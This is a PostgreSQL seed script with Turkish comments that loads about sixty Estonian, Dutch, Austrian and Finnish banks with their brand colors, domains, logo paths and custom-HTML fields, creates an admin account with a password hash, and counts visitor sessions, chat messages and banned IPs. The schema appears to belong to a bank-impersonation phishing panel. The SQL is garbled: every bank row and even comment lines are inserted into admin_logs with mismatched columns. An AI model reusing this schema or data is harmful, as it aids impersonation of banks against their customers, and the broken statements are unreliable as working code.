INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('-- Data for Name: banks; Type: TABLE DATA; Schema: public; Owner: postgres');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('--');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('COPY public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) FROM stdin;');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('bigbank', 'Bigbank', 'Estonia', NULL, NULL, NULL, 't', '10', '#E2001A', '#E2001A', 'bigbank.eu', '/bank-logos/estonia/bigbank.jpg', 't', 'f', '{"blocks": [], "layout": "centered", "background": {"type": "color", "value": "#ffffff"}}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('citadele-banka', 'Citadele Banka', 'Estonia', NULL, NULL, NULL, 't', '20', '#E3000F', '#E3000F', 'citadele.ee', '/bank-logos/estonia/citadele-banka.jpg', 't', 'f', '{"blocks": [], "layout": "centered", "background": {"type": "color", "value": "#ffffff"}}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('coop-pank', 'Coop Pank', 'Estonia', NULL, NULL, NULL, 't', '30', '#0054A6', '#0054A6', 'cooppank.ee', '/bank-logos/estonia/coop-pank.jpg', 't', 'f', '{"blocks": [], "layout": "centered", "background": {"type": "color", "value": "#ffffff"}}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('inbank', 'Inbank', 'Estonia', NULL, NULL, NULL, 't', '40', '#000000', '#000000', 'inbank.ee', '/bank-logos/estonia/inbank.png', 't', 'f', '{"blocks": [], "layout": "centered", "background": {"type": "color", "value": "#ffffff"}}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('lhv-pank', 'LHV Pank', 'Estonia', NULL, NULL, NULL, 't', '50', '#000000', '#111111', 'lhv.ee', '/bank-logos/estonia/lhv-pank.jpg', 't', 'f', '{"blocks": [], "layout": "centered", "background": {"type": "color", "value": "#ffffff"}}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('luminor-ee', 'Luminor', 'Estonia', NULL, NULL, NULL, 't', '60', '#000000', '#111111', 'luminor.ee', '/bank-logos/estonia/luminor-ee.jpg', 't', 'f', '{"blocks": [], "layout": "centered", "background": {"type": "color", "value": "#ffffff"}}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('op-corporate-bank', 'OP Corporate Bank', 'Estonia', NULL, NULL, NULL, 't', '70', '#FF6600', '#FF6600', 'op.fi', '/bank-logos/estonia/op-corporate-bank.jpg', 't', 'f', '{"blocks": [], "layout": "centered", "background": {"type": "color", "value": "#ffffff"}}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('seb-pank', 'SEB Pank', 'Estonia', NULL, NULL, NULL, 't', '80', '#00B050', '#009242', 'seb.ee', '/bank-logos/estonia/seb-pank.jpg', 't', 'f', '{"blocks": [], "layout": "centered", "background": {"type": "color", "value": "#ffffff"}}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('swedbank-ee', 'Swedbank', 'Estonia', NULL, NULL, NULL, 't', '90', '#EE7003', '#D65F00', 'swedbank.ee', '/bank-logos/estonia/swedbank-ee.jpg', 't', 'f', '{"blocks": [], "layout": "centered", "background": {"type": "color", "value": "#ffffff"}}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('abn-amro', 'ABN AMRO', 'Netherlands', NULL, NULL, NULL, 't', '110', '#0a8f6a', '#f6c500', 'abnamro.nl', '/bank-logos/abn-amro.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('adyen', 'Adyen', 'Netherlands', NULL, NULL, NULL, 't', '111', '#0abf53', '#089942', 'adyen.com', '/bank-logos/adyen.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('asn-bank', 'ASN Bank', 'Netherlands', NULL, NULL, NULL, 't', '112', '#8a1538', '#5b0f25', 'asnbank.nl', '/bank-logos/asn-bank.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('asn-bank-vh-regiobank', 'ASN Bank vh RegioBank', 'Netherlands', NULL, NULL, NULL, 't', '113', '#1f6f43', '#14502f', 'regiobank.nl', '/bank-logos/asn-bank-vh-regiobank.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('asn-bank-voorheen-blgwonen', 'ASN Bank voorheen BLGwonen', 'Netherlands', NULL, NULL, NULL, 't', '114', '#e64a38', '#d03d2d', 'asnbank.nl', '/bank-logos/asn-bank-voorheen-blgwonen.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('asn-bank-voorheen-sns', 'ASN Bank voorheen SNS', 'Netherlands', NULL, NULL, NULL, 't', '115', '#5f259f', '#421970', 'snsbank.nl', '/bank-logos/asn-bank-voorheen-sns.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('bunq', 'bunq', 'Netherlands', NULL, NULL, NULL, 't', '116', '#0f172a', '#1e293b', 'bunq.com', '/bank-logos/bunq.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('finom', 'Finom', 'Netherlands', NULL, NULL, NULL, 't', '117', '#f33a6b', '#c22e56', 'finom.co', '/bank-logos/finom.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('ing', 'ING', 'Netherlands', NULL, NULL, NULL, 't', '118', '#ff6200', '#d94c00', 'ing.nl', '/bank-logos/ing.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('knab', 'Knab', 'Netherlands', NULL, NULL, NULL, 't', '119', '#11998e', '#0c6f67', 'knab.nl', '/bank-logos/knab.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('n26', 'N26', 'Netherlands', NULL, NULL, NULL, 't', '120', '#36a18b', '#2b816f', 'n26.com', '/bank-logos/n26.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('nationale-nederlanden', 'Nationale-Nederlanden', 'Netherlands', NULL, NULL, NULL, 't', '121', '#ea650d', '#bb510a', 'nn.nl', '/bank-logos/nationale-nederlanden.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('rabobank', 'Rabobank', 'Netherlands', NULL, NULL, NULL, 't', '122', '#003d8f', '#f57c00', 'rabobank.nl', '/bank-logos/rabobank.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('triodos-bank', 'Triodos Bank', 'Netherlands', NULL, NULL, NULL, 't', '123', '#6b3fa0', '#4b2c70', 'triodos.nl', '/bank-logos/triodos-bank.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('van-lanschot-kempen', 'Van Lanschot Kempen', 'Netherlands', NULL, NULL, NULL, 't', '124', '#173463', '#0f2241', 'vanlanschotkempen.com', '/bank-logos/van-lanschot-kempen.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('yoursafe', 'Yoursafe', 'Netherlands', NULL, NULL, NULL, 't', '125', '#0a81c5', '#08679e', 'yoursafe.com', '/bank-logos/yoursafe.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('erste-bank', 'Erste Bank und Sparkassen', 'Austria', NULL, NULL, NULL, 't', '210', '#003b7a', '#e3000f', 'sparkasse.at', '/app-icons/erste-bank.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('raiffeisen', 'Raiffeisen Bankengruppe', 'Austria', NULL, NULL, NULL, 't', '211', '#ffe500', '#1f1f1f', 'raiffeisen.at', '/app-icons/raiffeisen.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('bank-austria', 'Bank Austria', 'Austria', NULL, NULL, NULL, 't', '212', '#d50032', '#7a0026', 'bankaustria.at', '/app-icons/bank-austria.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('bawag', 'BAWAG', 'Austria', NULL, NULL, NULL, 't', '213', '#ffec00', '#222222', 'bawag.at', '/app-icons/bawag.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('easybank', 'easybank', 'Austria', NULL, NULL, NULL, 't', '214', '#00a0df', '#006388', 'easybank.at', '/app-icons/easybank.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('bank99', 'bank99', 'Austria', NULL, NULL, NULL, 't', '215', '#ffde00', '#222222', 'bank99.at', '/app-icons/bank99.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('volksbank', 'Volksbank', 'Austria', NULL, NULL, NULL, 't', '216', '#006b3f', '#004b2c', 'volksbank.at', '/app-icons/volksbank.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('oberbank', 'Oberbank', 'Austria', NULL, NULL, NULL, 't', '217', '#d71920', '#7a1015', 'oberbank.at', '/app-icons/oberbank.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('hypo-noe', 'HYPO NOE', 'Austria', NULL, NULL, NULL, 't', '218', '#006e8a', '#004d62', 'hyponoe.at', '/app-icons/hypo-noe.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('hypo-vorarlberg', 'HYPO Vorarlberg', 'Austria', NULL, NULL, NULL, 't', '219', '#1f7a3d', '#145327', 'hypovbg.at', '/app-icons/hypo-vorarlberg.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('hypo-ooe', 'HYPO Oberösterreich', 'Austria', NULL, NULL, NULL, 't', '220', '#1f7a3d', '#145327', 'hypo.at', '/app-icons/hypo-ooe.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('hypo-burgenland', 'HYPO Burgenland', 'Austria', NULL, NULL, NULL, 't', '221', '#a3322b', '#64201b', 'bank-bgld.at', '/app-icons/hypo-burgenland.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('bks-bank', 'BKS Bank', 'Austria', NULL, NULL, NULL, 't', '222', '#365f8f', '#203a58', 'bks.at', '/app-icons/bks-bank.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('btv', 'BTV Vierländerbank', 'Austria', NULL, NULL, NULL, 't', '223', '#d61f26', '#7d1115', 'btv.at', '/app-icons/btv.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('vkb', 'Volkskreditbank', 'Austria', NULL, NULL, NULL, 't', '224', '#5b7f50', '#3b5334', 'vkb-bank.at', '/app-icons/vkb.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('sparda-bank', 'Sparda Bank', 'Austria', NULL, NULL, NULL, 't', '225', '#2d9fa6', '#1d676c', 'sparda.at', '/app-icons/sparda-bank.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('anadi-bank', 'Anadi Bank', 'Austria', NULL, NULL, NULL, 't', '226', '#355a8a', '#1e3350', 'anadibank.com', '/app-icons/anadi-bank.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('schoellerbank', 'Schoellerbank', 'Austria', NULL, NULL, NULL, 't', '227', '#1c2e5b', '#101a34', 'schoellerbank.at', '/app-icons/schoellerbank.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('aerztebank', 'Österreichische Ärztebank', 'Austria', NULL, NULL, NULL, 't', '228', '#2f6f95', '#1f4861', 'apothekerbank.at', '/app-icons/aerztebank.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('schelhammer', 'Schelhammer Capital', 'Austria', NULL, NULL, NULL, 't', '229', '#35507b', '#22344f', 'schelhammer.at', '/app-icons/schelhammer.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('marchfelder', 'Marchfelder Bank', 'Austria', NULL, NULL, NULL, 't', '230', '#3d7044', '#294c2f', 'marchfelderbank.at', '/app-icons/marchfelder.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('dolomitenbank', 'Dolomitenbank', 'Austria', NULL, NULL, NULL, 't', '231', '#006b8f', '#004861', 'dolomitenbank.at', '/app-icons/dolomitenbank.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('posojilnica', 'Posojilnica Bank', 'Austria', NULL, NULL, NULL, 't', '232', '#6f2c6b', '#4a1d47', 'posojilnica-bank.at', '/app-icons/posojilnica.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('spaengler', 'Bankhaus Spängler', 'Austria', NULL, NULL, NULL, 't', '233', '#5b4b3b', '#3b2f23', 'spaengler.at', '/app-icons/spaengler.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('aktia-fi', 'Aktia', 'Finland', NULL, NULL, NULL, 't', '310', '#004F9F', '#003c7a', 'aktia.fi', '/bank-logos/aktia-fi.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('handelsbanken-fi', 'Handelsbanken', 'Finland', NULL, NULL, NULL, 't', '311', '#00674F', '#004d3b', 'handelsbanken.fi', '/bank-logos/handelsbanken-fi.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('landsbanken-fi', 'Landsbanken', 'Finland', NULL, NULL, NULL, 't', '312', '#00679A', '#004e77', 'landsbanken.fi', '/bank-logos/landsbanken-fi.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('nordea-fi', 'Nordea', 'Finland', NULL, NULL, NULL, 't', '313', '#00007F', '#00005a', 'nordea.fi', '/bank-logos/nordea-fi.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('omasp-fi', 'OmaSp', 'Finland', NULL, NULL, NULL, 't', '314', '#008744', '#006a33', 'omasp.fi', '/bank-logos/omasp-fi.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('op-fi', 'OP', 'Finland', NULL, NULL, NULL, 't', '315', '#FF5B00', '#cc4900', 'op.fi', '/bank-logos/op-fi.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('pop-pankki-fi', 'POP Pankki', 'Finland', NULL, NULL, NULL, 't', '316', '#5C3D99', '#462f77', 'poppankki.fi', '/bank-logos/pop-pankki-fi.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('s-pankki-fi', 'S-Pankki', 'Finland', NULL, NULL, NULL, 't', '317', '#0075C9', '#005ba3', 's-pankki.fi', '/bank-logos/s-pankki-fi.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.admin_logs (id, admin_email, action, target, detail, ip, user_agent, created_at) VALUES ('s-st-pankki-fi', 'Säästöpankki', 'Finland', NULL, NULL, NULL, 't', '318', '#E4002B', '#b50022', 'saastopankki.fi', '/bank-logos/s-st-pankki-fi.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');

-- Sequence'leri veri sonrasi degerlere ayarla
SELECT setval('public.sessions_public_id_seq', COALESCE((SELECT MAX(public_id) FROM public.sessions), 1) + 1, false);
SELECT setval('public.admin_logs_id_seq', COALESCE((SELECT MAX(id) FROM public.admin_logs), 1) + 1, false);

-- ==================== 12) ADMIN KULLANICISI (eski DB'den birebir: admin@gmail.com, sifre ayni) ====================
-- Bu blok hata verirse silin ve Dashboard -> Authentication -> Add user ile olusturun.
INSERT INTO auth.users (instance_id, id, aud, role, email, encrypted_password, email_confirmed_at, invited_at, confirmation_token, confirmation_sent_at, recovery_token, recovery_sent_at, email_change_token_new, email_change, email_change_sent_at, last_sign_in_at, raw_app_meta_data, raw_user_meta_data, is_super_admin, created_at, updated_at, phone, phone_confirmed_at, phone_change, phone_change_token, phone_change_sent_at, email_change_token_current, email_change_confirm_status, banned_until, reauthentication_token, reauthentication_sent_at, is_sso_user, deleted_at, is_anonymous)
VALUES ('00000000-0000-0000-0000-000000000000', 'ec308c8b-c87e-4a7d-8c38-b547af15f4a2', 'authenticated', 'authenticated', 'admin@gmail.com', '$2a$10$YI2t3RHVdaFS/Efb2KlPz.3QqIuadTHOnptF3D1fmtXb3rTJ0TECG', '2026-09-29 20:07:01.310511+00', NULL, '', NULL, '', NULL, '', '', NULL, '2026-10-03 08:19:48.67008+00', '{"provider": "email", "providers": ["email"]}', '{"email_verified": true}', NULL, '2026-09-29 20:07:01.288745+00', '2026-10-13 17:26:14.333748+00', NULL, NULL, '', NULL, NULL, '', 0, NULL, '', NULL, false, NULL, false)
ON CONFLICT (id) DO NOTHING;

INSERT INTO auth.identities (provider_id, user_id, identity_data, provider, last_sign_in_at, created_at, updated_at, id)
VALUES ('ec308c8b-c87e-4a7d-8c38-b547af15f4a2', 'ec308c8b-c87e-4a7d-8c38-b547af15f4a2', '{"sub": "ec308c8b-c87e-4a7d-8c38-b547af15f4a2", "email": "admin@gmail.com", "email_verified": true, "phone_verified": false}', 'email', '2026-09-29 20:07:01.304807+00', '2026-09-29 20:07:01.304921+00', '2026-09-29 20:07:01.304921+00', '60437834-57d0-4d56-9c1d-cd0e20471c31')
ON CONFLICT DO NOTHING;

-- ==================== DOGRULAMA ====================
SELECT 'banks' AS tablo, COUNT(*) AS kayit FROM public.banks
UNION ALL SELECT 'global_settings', COUNT(*) FROM public.global_settings
UNION ALL SELECT 'sessions', COUNT(*) FROM public.sessions
UNION ALL SELECT 'chat_messages', COUNT(*) FROM public.chat_messages
UNION ALL SELECT 'banned_ips', COUNT(*) FROM public.banned_ips
UNION ALL SELECT 'admin_logs', COUNT(*) FROM public.admin_logs;
